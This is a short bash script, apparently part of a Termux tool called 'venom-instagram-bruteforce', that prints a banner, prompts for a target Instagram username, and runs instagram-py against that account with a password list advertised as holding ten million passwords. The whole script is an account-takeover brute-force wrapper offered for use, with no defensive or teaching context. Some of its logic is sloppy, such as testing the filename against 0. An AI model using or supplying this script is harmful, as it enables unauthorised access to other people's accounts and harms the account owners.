#10M passwords here
grn='\033[1;32m'
red='\033[1;31m'
rset='\033[0m'
ylo='\033[1;33m'
#!/bin/bash
clear
echo
echo '
   

____    ____  _______ .__   __.   ______   .___  ___. 
\   \  /   / |   ____||  \ |  |  /  __  \  |   \/   | 
 \   \/   /  |  |__   |   \|  | |  |  |  | |  \  /  | 
  \      /   |   __|  |  . `  | |  |  |  | |  |\/|  | 
   \    /    |  |____ |  |\   | |  `--`  | |  |  |  | 
    \__/     |_______||__| \__|  \______/  |__|  |__| 
                                                      
                        
               [#] 10,000,000 Password Attack [#]
' |lolcat
printf "\n"
printf "\n"
echo
read -p "[#] Enter Instagram ID/Username : " usrnm
echo
inspass=pass.txt
echo -e "\e[1;31m Loading all passwords... \e[0m"
sleep 4
if [ $inspass = 0 ]                                             
then
echo -e  "$ylo >>> exiting... <<<$rset"        
else

  instagram-py --username $usrnm --password-list $inspass

echo
sleep 30.0
cd /data/data/com.termux/files/home
fi
sleep 30.0
cd /data/data/com.termux/files/home/venom-instagram-bruteforce
bash main.sh
